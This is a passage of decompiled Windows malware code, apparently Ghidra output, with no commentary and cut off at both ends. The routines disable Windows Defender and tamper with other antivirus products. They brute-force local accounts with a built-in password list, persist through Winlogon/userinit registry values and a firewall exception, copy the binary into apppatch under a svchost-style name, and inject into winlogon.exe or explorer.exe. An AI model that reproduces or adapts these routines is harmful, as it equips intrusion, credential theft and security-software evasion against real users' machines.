  local_18.Privileges[0].Attributes = 2;
  BVar4 = LookupPrivilegeValueA
                    ((LPCSTR)0x0,s_SeSecurityPrivilege_004045a8,&local_18.Privileges[0].Luid);
  if (((BVar4 != 0) &&
      (BVar4 = AdjustTokenPrivileges(local_8,0,&local_18,0,(PTOKEN_PRIVILEGES)0x0,(PDWORD)0x0),
      BVar4 != 0)) && (DVar3 = GetLastError(), DVar3 == 0)) {
    uVar2 = 1;
  }
  CloseHandle(local_8);
  return uVar2;
}



int FUN_00401ea0(void)

{
  int iVar1;
  int iVar2;
  undefined4 uVar3;
  uint uVar4;
  int iVar5;
  undefined *puVar6;
  undefined4 *puVar7;
  undefined4 *puVar8;
  undefined auStack_330 [4];
  undefined4 local_32c;
  undefined4 uStack_328;
  int iStack_324;
  CHAR aCStack_234 [264];
  CHAR aCStack_12c [28];
  CHAR local_110 [268];
  
  iVar2 = 0;
  uVar3 = 0;
  local_32c = 0;
  do {
    GetModuleFileNameA((HMODULE)0x0,local_110,0x104);
    puVar7 = &uStack_328;
    puVar6 = auStack_330;
    iVar5 = -1;
    iVar1 = NetQueryDisplayInformation(0,1,uVar3,1000);
    puVar8 = puVar7;
    if ((iVar1 != 0) && (iVar1 != 0xea)) {
      return iVar2;
    }
    for (; iVar5 != 0; iVar5 = iVar5 + -1) {
      _snprintf(&stack0xfffffcc4,0x104,&DAT_00404d88,*puVar7);
      iVar1 = NetUserGetInfo(0,*puVar7,1,&stack0xfffffcb8);
      if ((iVar1 == 0) && (puVar6 != (undefined *)0x0)) {
        if (*(int *)(puVar6 + 0xc) == 2) {
          NetApiBufferFree(puVar6);
          iVar2 = FUN_004018e0(aCStack_12c,&stack0xfffffcc4,aCStack_234);
          if ((iVar2 == 0) &&
             (iVar2 = FUN_004018e0(aCStack_12c,&stack0xfffffcc4,aCStack_234), iVar2 == 0)) {
            _snprintf(aCStack_234,0x104,&DAT_00404d8c,&stack0xfffffcc4);
            iVar2 = FUN_004018e0(aCStack_12c,&stack0xfffffcc4,aCStack_234);
            if (iVar2 == 0) {
              _snprintf(aCStack_234,0x104,&DAT_00404d90,&stack0xfffffcc4);
              iVar2 = FUN_004018e0(aCStack_12c,&stack0xfffffcc4,aCStack_234);
              if (iVar2 == 0) {
                _snprintf(aCStack_234,0x104,s__s123_00404d98,&stack0xfffffcc4);
                iVar2 = FUN_004018e0(aCStack_12c,&stack0xfffffcc4,aCStack_234);
                if (iVar2 == 0) {
                  uVar4 = 0;
                  do {
                    iVar2 = FUN_004018e0(aCStack_12c,&stack0xfffffcc4,
                                         *(LPCSTR *)((int)&DAT_00459600 + uVar4));
                    if (iVar2 != 0) break;
                    SwitchToThread();
                    uVar4 = uVar4 + 4;
                  } while (uVar4 < 0x120);
                }
              }
            }
          }
        }
        else {
          NetApiBufferFree(puVar6);
        }
      }
      uVar3 = puVar7[5];
      puVar7 = puVar7 + 6;
    }
    NetApiBufferFree(puVar8);
    if (iVar2 != 0) {
      return iVar2;
    }
    if (iStack_324 != 0xea) {
      return 0;
    }
  } while( true );
}



void FUN_004020e0(void)

{
  int iVar1;
  BOOL BVar2;
  FARPROC pFVar3;
  HMODULE hModule;
  undefined4 *unaff_FS_OFFSET;
  CHAR local_124;
  undefined local_123 [259];
  HMODULE local_20;
  undefined *local_1c;
  undefined4 local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_00405288;
  puStack_10 = &DAT_00403c32;
  local_14 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_14;
  local_1c = &stack0xfffffed0;
  local_124 = '\0';
  memset(local_123,0,0x103);
  hModule = (HMODULE)0x0;
  iVar1 = SHGetFolderPathA(0,0x26,0,0,&local_124);
  if (-1 < iVar1) {
    PathAppendA(&local_124,s_Windows_Defender_00404da0);
    BVar2 = SetCurrentDirectoryA(&local_124);
    if (BVar2 != 0) {
      hModule = LoadLibraryA(s_MpClient_dll_00404db4);
      local_20 = hModule;
      if (hModule != (HMODULE)0x0) {
        pFVar3 = GetProcAddress(hModule,s_WDEnable_00404dc4);
        if (pFVar3 != (FARPROC)0x0) {
          local_8 = 0;
          (*pFVar3)(0);
          local_8 = 0xffffffff;
        }
      }
    }
  }
  if (hModule != (HMODULE)0x0) {
    FreeLibrary(hModule);
  }
  *unaff_FS_OFFSET = local_14;
  return;
}



void FUN_004021d0(void)

{
  HANDLE hDevice;
  DWORD local_c0;
  undefined local_bc [4];
  undefined4 local_b8;
  undefined4 local_b4;
  undefined4 local_b0;
  undefined4 local_ac;
  undefined4 local_a8;
  undefined4 local_a4;
  undefined4 local_a0;
  undefined4 local_9c;
  undefined4 local_98;
  undefined4 local_94;
  undefined4 local_90;
  undefined4 local_8c;
  undefined4 local_88;
  undefined4 local_84;
  undefined4 local_80;
  undefined4 local_7c;
  undefined4 local_78;
  undefined4 local_74;
  undefined4 local_70;
  undefined4 local_6c;
  undefined4 local_68;
  undefined4 local_64;
  undefined4 local_60;
  undefined4 local_5c;
  undefined4 local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined4 local_4c;
  undefined *local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  char *local_14;
  undefined4 local_10;
  undefined4 local_c;
  undefined4 local_8;
  
  local_b8 = 0xb4;
  local_b4 = 0x10;
  local_b0 = 0;
  local_ac = 0;
  local_a8 = 0;
  local_a4 = 0;
  local_a0 = 0;
  local_9c = 0;
  local_98 = 0;
  local_94 = 0;
  local_90 = 0x7b761e52;
  local_8c = 0x1c94cc7;
  local_88 = 0;
  local_84 = 0;
  local_80 = 0;
  local_7c = 0;
  local_78 = 1;
  local_74 = 1;
  local_70 = 0;
  local_6c = 1;
  local_68 = 0x20000000;
  local_64 = 0x1210064;
  local_60 = 0x22;
  local_5c = 0;
  local_58 = 0x4d0007;
  local_54 = 0x730065;
  local_50 = 0x610073;
  local_4c = 0x650067;
  local_48 = &DAT_00420000;
  local_44 = 0xb0022;
  local_40 = 0x490000;
  local_3c = 0x530053;
  local_38 = 0x560045;
  local_34 = 0x4e0045;
  local_30 = 0x490054;
  local_2c = 0x3d0044;
  local_28 = 0x300034;
  local_24 = 0x320030;
  local_20 = 0x650000;
  local_1c = 0x70006d;
  local_18 = 0x790074;
  local_14 = s__intpro_exe_0045003c + 1;
  local_10 = 0x70006d;
  local_c = 0x790074;
  local_8 = 0;
  hDevice = CreateFileA(s_____KmxAgent_00404dd0,0,0,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0);
  if (hDevice != (HANDLE)0xffffffff) {
    DeviceIoControl(hDevice,0x86000054,&local_b8,0xb4,local_bc,4,&local_c0,(LPOVERLAPPED)0x0);
    CloseHandle(hDevice);
  }
  return;
}



void FUN_00402360(void)

{
  HANDLE hFile;
  undefined4 local_64;
  undefined4 local_60;
  undefined4 local_5c;
  undefined4 local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined4 local_4c;
  undefined4 local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined uStack_20;
  _SECURITY_ATTRIBUTES local_1c;
  _FILETIME local_10;
  DWORD local_8;
  
  local_1c.lpSecurityDescriptor = (LPVOID)0x0;
  local_1c.bInheritHandle = 0;
  local_1c.nLength = 0;
  local_10.dwLowDateTime = 0;
  local_10.dwHighDateTime = 0;
  local_64 = 0xd48a445e;
  local_60 = 0x466e1597;
  local_5c = 0x327416ba;
  local_58 = 0x68ccde15;
  local_54 = 5;
  local_50 = 0;
  local_4c = 0x11;
  local_48 = 0;
  local_44 = 0;
  local_40 = 0x11;
  local_3c = 0xb5cb6c63;
  local_38 = 0x46df52db;
  local_34 = 0x65aa6b83;
  local_30 = 0x229bf18e;
  local_2c = 1;
  local_28 = 0;
  local_24 = 0;
  hFile = CreateFileA(s_____pipe_acsipc_server_00404df0,0xc0000000,3,&local_1c,3,0x80000080,
                      (HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    WriteFile(hFile,&local_64,0x28,&local_8,(LPOVERLAPPED)0x0);
    GetSystemTimeAsFileTime(&local_10);
    local_24._1_3_ = (undefined3)local_10.dwHighDateTime;
    local_24 = CONCAT31(local_24._1_3_,(char)(local_10.dwLowDateTime >> 0x18));
    uStack_20 = (undefined)(local_10.dwHighDateTime >> 0x18);
    WriteFile(hFile,&local_3c,0x1c,&local_8,(LPOVERLAPPED)0x0);
    CloseHandle(hFile);
  }
  return;
}



void FUN_00402450(void)

{
  char cVar1;
  undefined4 *puVar2;
  int iVar3;
  undefined4 *puVar4;
  CHAR local_20c [20];
  undefined local_1f8 [239];
  undefined4 uStack_109;
  undefined local_f4 [240];
  
  iVar3 = SHGetFolderPathA(0,0x26,0,0,(int)&uStack_109 + 1);
  if (iVar3 != 1) {
    iVar3 = 0;
    do {
      cVar1 = *(char *)((int)&uStack_109 + iVar3 + 1);
      local_20c[iVar3] = cVar1;
      iVar3 = iVar3 + 1;
    } while (cVar1 != '\0');
    puVar2 = &uStack_109;
    do {
      puVar4 = puVar2;
      puVar2 = (undefined4 *)((int)puVar4 + 1);
    } while (*(char *)((int)puVar4 + 1) != '\0');
    *(undefined4 *)((int)puVar4 + 1) = DAT_00404e08;
    *(undefined4 *)((int)puVar4 + 5) = DAT_00404e0c;
    *(undefined4 *)((int)puVar4 + 9) = DAT_00404e10;
    *(undefined4 *)((int)puVar4 + 0xd) = DAT_00404e14;
    *(undefined4 *)((int)puVar4 + 0x11) = DAT_00404e18;
    *(undefined *)((int)puVar4 + 0x15) = DAT_00404e1c;
    puVar2 = (undefined4 *)&stack0xfffffdf3;
    do {
      puVar4 = puVar2;
      puVar2 = (undefined4 *)((int)puVar4 + 1);
    } while (*(char *)((int)puVar4 + 1) != '\0');
    *(undefined4 *)((int)puVar4 + 1) = DAT_00404e20;
    *(undefined4 *)((int)puVar4 + 5) = DAT_00404e24;
    *(undefined4 *)((int)puVar4 + 9) = DAT_00404e28;
    *(undefined4 *)((int)puVar4 + 0xd) = DAT_00404e2c;
    *(undefined4 *)((int)puVar4 + 0x11) = DAT_00404e30;
    *(undefined *)((int)puVar4 + 0x15) = DAT_00404e34;
    MoveFileA((LPCSTR)((int)&uStack_109 + 1),local_20c);
  }
  return;
}



void FUN_00402540(void)

{
  undefined4 *puVar1;
  int iVar2;
  undefined4 *puVar3;
  HANDLE hFile;
  CHAR local_110 [260];
  DWORD local_c;
  undefined local_5;
  
  local_5 = 0;
  iVar2 = SHGetFolderPathA(0,0x23,0,0,local_110);
  if (iVar2 != 1) {
    puVar1 = (undefined4 *)&stack0xfffffeef;
    do {
      puVar3 = puVar1;
      puVar1 = (undefined4 *)((int)puVar3 + 1);
    } while (*(char *)((int)puVar3 + 1) != '\0');
    *(undefined4 *)((int)puVar3 + 1) = s__PrevxCSI_csidb_csi_00404e38._0_4_;
    *(undefined4 *)((int)puVar3 + 5) = s__PrevxCSI_csidb_csi_00404e38._4_4_;
    *(undefined4 *)((int)puVar3 + 9) = s__PrevxCSI_csidb_csi_00404e38._8_4_;
    *(undefined4 *)((int)puVar3 + 0xd) = s__PrevxCSI_csidb_csi_00404e38._12_4_;
    *(undefined4 *)((int)puVar3 + 0x11) = s__PrevxCSI_csidb_csi_00404e38._16_4_;
    hFile = CreateFileA(local_110,0xc0000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0);
    if (hFile != (HANDLE)0xffffffff) {
      SetFilePointer(hFile,0x17a8,(PLONG)0x0,0);
      WriteFile(hFile,&local_5,1,&local_c,(LPOVERLAPPED)0x0);
      SetFilePointer(hFile,0xb98,(PLONG)0x0,0);
      WriteFile(hFile,&local_5,1,&local_c,(LPOVERLAPPED)0x0);
      SetFilePointer(hFile,0x17e4,(PLONG)0x0,0);
      WriteFile(hFile,&local_5,1,&local_c,(LPOVERLAPPED)0x0);
      SetFilePointer(hFile,0x17dc,(PLONG)0x0,0);
      WriteFile(hFile,&local_5,1,&local_c,(LPOVERLAPPED)0x0);
      SetFilePointer(hFile,0x3380,(PLONG)0x0,0);
      WriteFile(hFile,&local_5,1,&local_c,(LPOVERLAPPED)0x0);
      CloseHandle(hFile);
    }
  }
  return;
}



void FUN_00402680(void)

{
  HRESULT HVar1;
  BSTR bstrString;
  int iVar2;
  WCHAR local_238 [260];
  int *local_30;
  HRESULT local_2c;
  int *local_28;
  short local_24 [2];
  short local_20 [2];
  int *local_1c;
  int *local_18;
  BSTR local_14;
  int *local_10;
  int *local_c;
  int *local_8;
  
  local_18 = (int *)0x0;
  local_1c = (int *)0x0;
  local_c = (int *)0x0;
  local_10 = (int *)0x0;
  local_8 = (int *)0x0;
  HVar1 = CoInitializeEx((LPVOID)0x0,2);
  if (((HVar1 == 0) || (HVar1 == 1)) || (HVar1 == -0x7ffefefa)) {
    local_2c = HVar1;
    GetModuleFileNameW((HMODULE)0x0,local_238,0x104);
    local_14 = SysAllocString(local_238);
    if (local_14 != (BSTR)0x0) {
      bstrString = SysAllocString(u_Windows_Explorer_00404e4c);
      if (bstrString != (BSTR)0x0) {
        local_28 = (int *)0x0;
        HVar1 = CoCreateInstance((IID *)&DAT_00404e70,(LPUNKNOWN)0x0,0x4401,(IID *)&DAT_00404e80,
                                 &local_28);
        if ((HVar1 == 0) && (local_28 != (int *)0x0)) {
          local_18 = local_28;
          iVar2 = (**(code **)(*local_28 + 0x1c))(local_28,&local_1c);
          if (((iVar2 == 0) &&
              (iVar2 = (**(code **)(*local_1c + 0x1c))(local_1c,&local_c), iVar2 == 0)) &&
             ((iVar2 = (**(code **)(*local_c + 0x20))(local_c,local_20), iVar2 == 0 &&
              ((local_20[0] == -1 &&
               (iVar2 = (**(code **)(*local_c + 0x50))(local_c,&local_10), iVar2 == 0)))))) {
            iVar2 = (**(code **)(*local_10 + 0x28))(local_10,local_14,&local_8);
            if (iVar2 == -0x7ff8fffe) {
              local_30 = (int *)0x0;
              HVar1 = CoCreateInstance((IID *)&DAT_00404e90,(LPUNKNOWN)0x0,0x4401,
                                       (IID *)&DAT_00404ea0,&local_30);
              if ((HVar1 != 0) || (local_8 = local_30, local_30 == (int *)0x0)) {
                local_8 = (int *)0x0;
              }
              if ((((local_8 != (int *)0x0) &&
                   (iVar2 = (**(code **)(*local_8 + 0x20))(local_8,bstrString), iVar2 == 0)) &&
                  (iVar2 = (**(code **)(*local_8 + 0x28))(local_8,local_14), iVar2 == 0)) &&
                 (iVar2 = (**(code **)(*local_8 + 0x38))(local_8,0), iVar2 == 0)) {
                (**(code **)(*local_10 + 0x20))(local_10,local_8);
              }
            }
            else {
              iVar2 = (**(code **)(*local_8 + 0x44))(local_8,local_24);
              if ((iVar2 == 0) && (local_24[0] != -1)) {
                (**(code **)(*local_8 + 0x48))(local_8,0xffffffff);
              }
            }
          }
        }
        else {
          local_18 = (int *)0x0;
        }
      }
      SysFreeString(local_14);
      HVar1 = local_2c;
      if (bstrString != (BSTR)0x0) {
        SysFreeString(bstrString);
        HVar1 = local_2c;
      }
    }
    if (local_8 != (int *)0x0) {
      (**(code **)(*local_8 + 8))(local_8);
    }
    if (local_10 != (int *)0x0) {
      (**(code **)(*local_10 + 8))(local_10);
    }
    if (local_c != (int *)0x0) {
      (**(code **)(*local_c + 8))(local_c);
    }
    if (local_1c != (int *)0x0) {
      (**(code **)(*local_1c + 8))(local_1c);
    }
    if (local_18 != (int *)0x0) {
      (**(code **)(*local_18 + 8))(local_18);
    }
    if ((HVar1 == 0) || (HVar1 == 1)) {
      CoUninitialize();
    }
  }
  return;
}



void FUN_004028d0(void)

{
  ATOM AVar1;
  BOOL BVar2;
  char *pcVar3;
  int iVar4;
  undefined local_5;
  
  AVar1 = GlobalFindAtomA(s_PWed_Jul_6_06_49_26_20112_00404eaf + 1);
  if (AVar1 == 0) {
    GlobalAddAtomA(s_PWed_Jul_6_06_49_26_20112_00404eaf + 1);
    BVar2 = IsUserAnAdmin();
    if (BVar2 != 0) {
      RtlAdjustPrivilege(0x14,1,0,&local_5);
    }
    BVar2 = IsUserAnAdmin();
    pcVar3 = s_winlogon_exe_00404ecc;
    if (BVar2 == 0) {
      pcVar3 = s_explorer_exe_00404edc;
    }
    iVar4 = FUN_004015a0(pcVar3);
    if (iVar4 != 0) {
      FUN_00401670();
    }
  }
  return;
}



void FUN_00402930(void)

{
  BYTE BVar1;
  LSTATUS LVar2;
  BYTE *pBVar3;
  int iVar4;
  BYTE *unaff_ESI;
  char *lpValueName;
  CHAR local_110 [260];
  DWORD local_c;
  HKEY local_8;
  
  local_8 = (HKEY)0x0;
  local_c = 0xff0ff;
  LVar2 = RegCreateKeyExA((HKEY)0x80000002,s_software_microsoft_windows_nt_cu_004044b8,0,(LPSTR)0x0,
                          0,0x102,(LPSECURITY_ATTRIBUTES)0x0,&local_8,(LPDWORD)0x0);
  if (LVar2 == 0) {
    GetEnvironmentVariableA(s_NSystemDrive_004044a7 + 1,local_110,0x104);
    PathAddBackslashA(local_110);
    GetVolumeInformationA(local_110,(LPSTR)0x0,0,&local_c,(LPDWORD)0x0,(LPDWORD)0x0,(LPSTR)0x0,0);
    _snprintf(local_110,0x104,&DAT_004044b4,local_c);
    pBVar3 = unaff_ESI;
    do {
      BVar1 = *pBVar3;
      pBVar3 = pBVar3 + 1;
    } while (BVar1 != '\0');
    iVar4 = (int)pBVar3 - (int)(unaff_ESI + 1);
    lpValueName = local_110;
  }
  else {
    LVar2 = RegCreateKeyExA((HKEY)0x80000001,s_software_microsoft_windows_curre_004044f0,0,
                            (LPSTR)0x0,0,0x102,(LPSECURITY_ATTRIBUTES)0x0,&local_8,(LPDWORD)0x0);
    if (LVar2 != 0) goto LAB_00402a44;
    pBVar3 = unaff_ESI;
    do {
      BVar1 = *pBVar3;
      pBVar3 = pBVar3 + 1;
    } while (BVar1 != '\0');
    iVar4 = (int)pBVar3 - (int)(unaff_ESI + 1);
    lpValueName = s_userinit_00404520;
  }
  RegSetValueExA(local_8,lpValueName,0,1,unaff_ESI,iVar4 + 1);
LAB_00402a44:
  if (local_8 != (HKEY)0x0) {
    RegFlushKey(local_8);
    RegCloseKey(local_8);
  }
  return;
}



void FUN_00402a70(void)

{
  char *pcVar1;
  char cVar2;
  ATOM AVar3;
  int iVar4;
  BOOL BVar5;
  HMODULE pHVar6;
  FARPROC pFVar7;
  HANDLE pvVar8;
  uint uVar9;
  undefined4 *puVar10;
  undefined4 *puVar11;
  LPVOID lpMem;
  undefined4 *puVar12;
  undefined4 *puVar13;
  DWORD DVar14;
  DWORD *pDVar15;
  LPVOID lpMem_00;
  DWORD DStack_340;
  undefined local_33c [28];
  CHAR aCStack_320 [4];
  undefined auStack_31c [6];
  char acStack_316 [254];
  CHAR aCStack_218 [264];
  char acStack_110 [268];
  
  local_33c._4_4_ = (HMODULE)0x0;
  local_33c._8_4_ = 0;
  local_33c._12_4_ = 0;
  local_33c._16_4_ = 0;
  local_33c._20_4_ = 0;
  local_33c._24_4_ = 0;
  local_33c._0_4_ = (PVOID)0x0;
  VirtualQuery(FUN_00401cb0,(PMEMORY_BASIC_INFORMATION)local_33c,0x1c);
  GetModuleFileNameA((HMODULE)local_33c._4_4_,aCStack_218,0x104);
  iVar4 = 0;
  do {
    cVar2 = (&DAT_0045a130)[iVar4];
    aCStack_320[iVar4] = cVar2;
    iVar4 = iVar4 + 1;
  } while (cVar2 != '\0');
  BVar5 = PathFileExistsA(aCStack_320);
  if (BVar5 == 0) {
    GetSystemWindowsDirectoryA(aCStack_320,0x104);
    puVar11 = (undefined4 *)(local_33c + 0x1b);
    do {
      puVar10 = puVar11;
      puVar11 = (undefined4 *)((int)puVar10 + 1);
    } while (*(char *)((int)puVar10 + 1) != '\0');
    *(undefined4 *)((int)puVar10 + 1) = s__apppatch__00404eec._0_4_;
    *(undefined4 *)((int)puVar10 + 5) = s__apppatch__00404eec._4_4_;
    *(undefined2 *)((int)puVar10 + 9) = s__apppatch__00404eec._8_2_;
    *(char *)((int)puVar10 + 0xb) = s__apppatch__00404eec[10];
    DStack_340 = 0;
    pHVar6 = GetModuleHandleA(s_kernel32_dll_00404578);
    if (pHVar6 != (HMODULE)0x0) {
      pFVar7 = GetProcAddress(pHVar6,s_IsWow64Process_00404588);
      if (pFVar7 != (FARPROC)0x0) {
        pDVar15 = &DStack_340;
        pvVar8 = GetCurrentProcess();
        (*pFVar7)(pvVar8,pDVar15);
      }
    }
    if (DStack_340 == 0) {
      DVar14 = GetTickCount();
      uVar9 = FUN_00401390(DVar14);
      puVar10 = (undefined4 *)FUN_00401420((uVar9 & 1) + 6);
      puVar11 = puVar10;
      do {
        cVar2 = *(char *)puVar11;
        puVar11 = (undefined4 *)((int)puVar11 + 1);
      } while (cVar2 != '\0');
      puVar13 = (undefined4 *)(local_33c + 0x1b);
      do {
        pcVar1 = (char *)((int)puVar13 + 1);
        puVar13 = (undefined4 *)((int)puVar13 + 1);
      } while (*pcVar1 != '\0');
      puVar12 = puVar10;
      for (uVar9 = (uint)((int)puVar11 - (int)puVar10) >> 2; uVar9 != 0; uVar9 = uVar9 - 1) {
        *puVar13 = *puVar12;
        puVar12 = puVar12 + 1;
        puVar13 = puVar13 + 1;
      }
      for (uVar9 = (int)puVar11 - (int)puVar10 & 3; uVar9 != 0; uVar9 = uVar9 - 1) {
        *(undefined *)puVar13 = *(undefined *)puVar12;
        puVar12 = (undefined4 *)((int)puVar12 + 1);
        puVar13 = (undefined4 *)((int)puVar13 + 1);
      }
      puVar11 = (undefined4 *)(local_33c + 0x1b);
      do {
        puVar10 = puVar11;
        puVar11 = (undefined4 *)((int)puVar10 + 1);
      } while (*(char *)((int)puVar10 + 1) != '\0');
      *(undefined4 *)((int)puVar10 + 1) = DAT_00404f04;
      *(undefined *)((int)puVar10 + 5) = DAT_00404f08;
    }
    else {
      puVar11 = (undefined4 *)(local_33c + 0x1b);
      do {
        puVar10 = puVar11;
        puVar11 = (undefined4 *)((int)puVar10 + 1);
      } while (*(char *)((int)puVar10 + 1) != '\0');
      *(undefined4 *)((int)puVar10 + 1) = s_svchost_exe_00404ef8._0_4_;
      *(undefined4 *)((int)puVar10 + 5) = s_svchost_exe_00404ef8._4_4_;
      *(undefined4 *)((int)puVar10 + 9) = s_svchost_exe_00404ef8._8_4_;
    }
  }
  _snprintf(acStack_110,0x104,&DAT_00404f0c,aCStack_320);
  BVar5 = CopyFileA(aCStack_218,aCStack_320,1);
  if (BVar5 != 0) {
    FUN_00402930();
    FUN_00401b20((int)aCStack_320);
    lpMem = FUN_00401150(&DStack_340);
    if (lpMem != (LPVOID)0x0) {
      iVar4 = RtlImageNtHeader(lpMem);
      if (iVar4 != 0) {
        *(ushort *)(iVar4 + 0x16) = *(ushort *)(iVar4 + 0x16) & 0xdfff;
        FUN_00401000(lpMem);
      }
      DVar14 = 0;
      lpMem_00 = lpMem;
      pvVar8 = GetProcessHeap();
      BVar5 = HeapValidate(pvVar8,DVar14,lpMem_00);
      if (BVar5 != 0) {
        DVar14 = 0;
        pvVar8 = GetProcessHeap();
        HeapFree(pvVar8,DVar14,lpMem);
      }
    }
    FUN_00401be0(aCStack_320);
    MoveFileExA(acStack_110,aCStack_320,4);
    DStack_340 = 0;
    pHVar6 = GetModuleHandleA(s_kernel32_dll_00404578);
    if (pHVar6 != (HMODULE)0x0) {
      pFVar7 = GetProcAddress(pHVar6,s_IsWow64Process_00404588);
      if (pFVar7 != (FARPROC)0x0) {
        pDVar15 = &DStack_340;
        pvVar8 = GetCurrentProcess();
        (*pFVar7)(pvVar8,pDVar15);
      }
    }
    if (DStack_340 != 0) {
      FUN_004014b0((DWORD)aCStack_320);
    }
    AVar3 = GlobalFindAtomA(s_Wed_Jul_6_06_49_26_20111_00404f10);
    if (AVar3 != 0) {
      FUN_004012b0();
                    // WARNING: Subroutine does not return
      ExitProcess(0);
    }
    GlobalAddAtomA(s_Wed_Jul_6_06_49_26_20111_00404f10);
  }
  return;
}



void entry(void)

{
  ATOM AVar1;
  int iVar2;
  HWND hWnd;
  DWORD lParam;
  BOOL BVar3;
  HMODULE hModule;
  FARPROC pFVar4;
  HANDLE pvVar5;
  LPSTR pCVar6;
  char *pcVar7;
  int *piVar8;
  CHAR local_110 [260];
  int local_c;
  undefined local_5;
  
  LoadLibraryA(s_user32_dll_00404f2c);
  GetModuleFileNameA((HMODULE)0x0,local_110,0x104);
  iVar2 = FUN_00403a20();
  if (iVar2 != 0) {
                    // WARNING: Subroutine does not return
    ExitProcess(0);
  }
  FUN_004021d0();
  FUN_004020e0();
  hWnd = FindWindowA(s_____AVP_Root_00404de0,(LPCSTR)0x0);
  if (hWnd != (HWND)0x0) {
    lParam = GetTickCount();
    PostMessageA(hWnd,0x466,0x10001,lParam);
  }
  FUN_00402360();
  FUN_00402450();
  FUN_00402540();
  FUN_00402680();
  BVar3 = IsUserAnAdmin();
  if (BVar3 == 0) {
    iVar2 = FUN_00401ea0();
    if (iVar2 != 0) {
                    // WARNING: Subroutine does not return
      ExitProcess(0);
    }
    iVar2 = FUN_00403560();
    if (iVar2 != 0) {
                    // WARNING: Subroutine does not return
      ExitProcess(0);
    }
  }
  BVar3 = IsUserAnAdmin();
  local_c = 0;
  hModule = GetModuleHandleA(s_kernel32_dll_00404578);
  if (hModule != (HMODULE)0x0) {
    pFVar4 = GetProcAddress(hModule,s_IsWow64Process_00404588);
    if (pFVar4 != (FARPROC)0x0) {
      piVar8 = &local_c;
      pvVar5 = GetCurrentProcess();
      (*pFVar4)(pvVar5,piVar8);
    }
  }
  if (local_c == 0) {
    if (BVar3 == 0) {
      FUN_00402930();
      AVar1 = GlobalFindAtomA(s_PWed_Jul_6_06_49_26_20112_00404eaf + 1);
      if (AVar1 == 0) {
        GlobalAddAtomA(s_PWed_Jul_6_06_49_26_20112_00404eaf + 1);
        BVar3 = IsUserAnAdmin();
        if (BVar3 != 0) {
          RtlAdjustPrivilege(0x14,1,0,&local_5);
        }
        BVar3 = IsUserAnAdmin();
        pcVar7 = s_winlogon_exe_00404ecc;
        if (BVar3 == 0) {
          pcVar7 = s_explorer_exe_00404edc;
        }
        iVar2 = FUN_004015a0(pcVar7);
        if (iVar2 != 0) {
          FUN_00401670();
        }
      }
    }
    else {
      pCVar6 = StrStrIA(local_110,s__apppatch__00404eec);
      if (pCVar6 == (LPSTR)0x0) {
        FUN_00402a70();
        AVar1 = GlobalFindAtomA(s_PWed_Jul_6_06_49_26_20112_00404eaf + 1);
        if (AVar1 == 0) {
          GlobalAddAtomA(s_PWed_Jul_6_06_49_26_20112_00404eaf + 1);
          BVar3 = IsUserAnAdmin();
          if (BVar3 != 0) {
            RtlAdjustPrivilege(0x14,1,0,&local_5);
          }
          BVar3 = IsUserAnAdmin();
          pcVar7 = s_winlogon_exe_00404ecc;
          if (BVar3 == 0) {
            pcVar7 = s_explorer_exe_00404edc;
          }
          iVar2 = FUN_004015a0(pcVar7);
          if (iVar2 != 0) {
            FUN_00401670();
          }
        }
        FUN_004012b0();
      }
      else {
        FUN_00402930();
        FUN_004028d0();
      }
    }
  }
  else {
    if (BVar3 != 0) {
      pCVar6 = StrStrIA(local_110,s__apppatch__00404eec);
      if (pCVar6 == (LPSTR)0x0) {
        FUN_00402a70();
        FUN_004012b0();
        goto LAB_00402f58;
      }
    }
    FUN_00402930();
    GetCurrentProcessId();
    FUN_00401670();
    Sleep(0xffffffff);
  }
LAB_00402f58:
                    // WARNING: Subroutine does not return
  ExitProcess(0);
}



void FUN_00402f70(OLECHAR *param_1)

{
  HANDLE hHeap;
  BSTR *ppOVar1;
  BSTR pOVar2;
  undefined4 *unaff_EDI;
  DWORD dwFlags;
  SIZE_T dwBytes;
  
  dwBytes = 0x10;
  dwFlags = 8;
  hHeap = GetProcessHeap();
  ppOVar1 = (BSTR *)HeapAlloc(hHeap,dwFlags,dwBytes);
  if (ppOVar1 != (BSTR *)0x0) {
    *ppOVar1 = (BSTR)0x0;
    ppOVar1[3] = (BSTR)0x0;
    ppOVar1[1] = (BSTR)0x0;
    ppOVar1[2] = (BSTR)0x1;
    pOVar2 = SysAllocString(param_1);
    *ppOVar1 = pOVar2;
    *unaff_EDI = ppOVar1;
    return;
  }
  *unaff_EDI = 0;
  return;
}



void FUN_00402fc0(void)

{
  int iVar1;
  LONG LVar2;
  int *unaff_ESI;
  
  iVar1 = *unaff_ESI;
  if (iVar1 != 0) {
    LVar2 = InterlockedDecrement((LONG *)(iVar1 + 8));
    if ((LVar2 == 0) && (iVar1 != 0)) {
      FUN_00402ff0();
    }
    *unaff_ESI = 0;
  }
  return;
}



void FUN_00402ff0(void)

{
  HANDLE pvVar1;
  BOOL BVar2;
  BSTR *unaff_EDI;
  DWORD DVar3;
  BSTR lpMem;
  BSTR lpMem_00;
  BSTR *lpMem_01;
  
  if (*unaff_EDI != (BSTR)0x0) {
    SysFreeString(*unaff_EDI);
  }
  lpMem_00 = unaff_EDI[1];
  if (lpMem_00 != (BSTR)0x0) {
    DVar3 = 0;
    lpMem = lpMem_00;
    pvVar1 = GetProcessHeap();
    BVar2 = HeapValidate(pvVar1,DVar3,lpMem);
    if (BVar2 != 0) {
      DVar3 = 0;
      pvVar1 = GetProcessHeap();
      HeapFree(pvVar1,DVar3,lpMem_00);
    }
  }
  DVar3 = 0;
  lpMem_01 = unaff_EDI;
  pvVar1 = GetProcessHeap();
  BVar2 = HeapValidate(pvVar1,DVar3,lpMem_01);
